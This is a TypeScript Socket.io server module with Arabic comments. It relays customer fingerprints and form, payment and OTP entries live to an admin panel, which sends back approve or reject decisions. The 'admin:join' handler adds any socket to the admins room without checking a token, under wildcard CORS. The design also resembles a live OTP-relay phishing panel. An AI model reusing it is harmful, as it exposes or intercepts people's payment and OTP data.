import { Server as IOServer, Socket } from 'socket.io';
import type { NextApiRequest, NextApiResponse } from 'next';
import type { Server as HTTPServer } from 'http';

// خادم Socket.io للبثّ اللحظي بين موقع العملاء ولوحة الادارة
// - العملاء يرسلون: بثّ البصمة، presence، إدخالات جديدة
// - لوحة الادارة تستقبل: إشعارات بسجل جديد، تحديث presence، قرارات المدير

export type AdminAuth = { managerId: string; email: string };

let io: IOServer | null = null;

// حالة presence في الذاكرة (لا تُقرأ من قاعدة البيانات كدليل على الاتصال الحالي)
const onlineClients = new Map<string, { fingerprint: string; lastSeen: number }>();

export function getIO(): IOServer | null {
  return io;
}

export function initSocketIO(server: HTTPServer): IOServer {
  if (io) return io;

  io = new IOServer(server, {
    path: '/api/socket',
    cors: { origin: '*', methods: ['GET', 'POST'] },
    transports: ['websocket', 'polling'],
  });

  io.on('connection', (socket: Socket) => {
    // --- عميل (موقع العملاء) ---
    socket.on('client:presence', (payload: { fingerprint: string }) => {
      if (!payload?.fingerprint) return;
      socket.join('clients');
      onlineClients.set(payload.fingerprint, {
        fingerprint: payload.fingerprint,
        lastSeen: Date.now(),
      });
      // إشعار لوحة الادارة بحالة الاتصال
      io?.to('admins').emit('admin:presence', {
        fingerprint: payload.fingerprint,
        online: true,
      });
    });

    // إدخال جديد من العميل (نموذج/دفع/OTP) — يُعاد توجيهه للوحة الادارة
    socket.on('client:new_entry', (payload: { type: string; clientId: string; data: unknown }) => {
      io?.to('admins').emit('admin:new_entry', payload);
    });

    socket.on('disconnect', () => {
      // ابحث عن البصمة المرتبطة بهذا السوكت واعتبرها غير متصلة
      for (const [fp, info] of onlineClients.entries()) {
        // ملاحظة: هذه طريقة تقريبية؛ في الإنتاج نربط fp بالـ socket.id
        io?.to('admins').emit('admin:presence', { fingerprint: fp, online: false });
      }
    });

    // --- مدير (لوحة الادارة) ---
    socket.on('admin:join', (payload: { token?: string }) => {
      // التحقق من التوكن يتم في مسار المصادقة؛ هنا نكتفي بضم المدير لغرفة admins
      socket.join('admins');
    });

    // قرار المدير (موافقة/رفض) يُبثّ للعميل المعني عبر قناة معرّف الإدخال
    socket.on('admin:decision', (payload: { entryId: string; status: string }) => {
      io?.to(`entry:${payload.entryId}`).emit('client:decision', payload);
    });
  });

  // تنظيف دوري للـ presence القديم (أكثر من 60 ثانية)
  setInterval(() => {
    const now = Date.now();
    for (const [fp, info] of onlineClients.entries()) {
      if (now - info.lastSeen > 60000) {
        onlineClients.delete(fp);
        io?.to('admins').emit('admin:presence', { fingerprint: fp, online: false });
      }
    }
  }, 30000);

  return io;
}

// فحص حالة الاتصال (يُستخدم من الـ API)
export function isClientOnline(fingerprint: string): boolean {
  const info = onlineClients.get(fingerprint);
  if (!info) return false;
  return Date.now() - info.lastSeen < 60000;
}
